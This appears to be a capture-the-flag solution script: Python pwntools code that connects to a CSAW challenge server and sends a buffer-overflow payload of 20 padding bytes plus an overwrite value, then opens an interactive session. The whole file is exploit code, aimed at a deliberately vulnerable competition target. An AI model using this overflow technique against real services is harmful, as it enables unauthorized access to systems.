from pwn import *

def payload():
    return "A"*20+"\xee\xba\xf3\xca"

connection = remote("pwn.chal.csaw.io", 9000)
while 1:
  try:
   response = connection.recvuntil("?")
  except:
   connection.interactive()
  print response
  connection.sendline(payload())
